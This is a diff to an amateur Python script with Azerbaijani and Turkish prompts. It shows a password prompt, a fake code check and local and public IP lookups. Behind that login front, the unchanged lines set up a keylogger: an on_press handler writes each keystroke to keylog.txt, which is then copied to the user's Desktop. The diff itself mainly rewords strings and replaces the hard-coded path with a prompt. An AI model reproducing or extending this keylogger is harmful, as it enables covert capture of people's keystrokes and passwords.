@@ -3,36 +3,35 @@ import random
 import os
 from urllib.request import urlopen
 import re
-print("Sisteme Xos Gelmisiniz ")
-ad=input("istifadeci adi daxil edin : ")
+print("Hos Geldiniz ")
+isim=input("Istifadeci Adi Daxil Edin : ")
 while True:
-    sifre=input("Sifrenizi Daxil Edin : ")
+    sifre=input("Sifrenizi girin: ")
     if len(sifre)<=8:
-        print("Daha Guclu Sifre Daxil Edin ! ")
+        print("Daha Guclu Sifre girin ! ")
         continue
     else:
-        print("Melumatlarinizi Dogrulayin : ")
+        print("Bilgilərinizi Dogrulayin : ")
         break
-
 while True:
-    sifre2=input("Sifrenizi Yeniden Daxil Edin :")
+    sifre2=input("Sifrenizi Yeniden girin :")
     if sifre2!=sifre:
-        print("Sifrenizi Dogru Daxil Edin :")
+        print("Sifrenizi Dogru girin  :")
         continue
     else:
-        print("Dogrulama Merhelesi  ----->")
+        print("Dogrulama  ----->")
         break
 
 def verification():
     kod = random.randint(100, 1000)
-    print("Gördüğünüz Kodu Daxil Edin:")
+    print("Gördüyünüz Kodu girin:")
     print("Kod:", kod)
     kod2 = int(input("Kodunuz: "))
     if kod != kod2:
         print("Kodu doğru yazın!")
         verification()
     else:
-        print("Xos Geldiniz!")
+        print("Xoş Geldiniz!")
 verification()
 
 sistem=os.name
@@ -59,7 +58,7 @@ def get_ip_address():
     except socket.error:
         return "IP adresiniz Tapilmadi"
 
-print("Local Ip Adresini:", get_ip_address())
+print("Local Ip Adresiniz:", get_ip_address())
 
 def get_public_ip():
     data = str(urlopen('http://checkip.dyndns.com/').read())
@@ -73,7 +72,8 @@ import logging
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 import shutil
 src_file = "keylog.txt"
-dst_file = "C:\\Users\\{istiface_adi}\\Desktop\\deneme.txt"  
+username = input("Komputerdeki Istifadeci adinizi yazin meselen C:\\Users\\Farid : ")
+dst_file = "C:\\Users\\" + username + "\\Desktop\\deneme.txt"
 shutil.copy(src_file, dst_file)
 def on_press(key):
     logging.info(str(key))
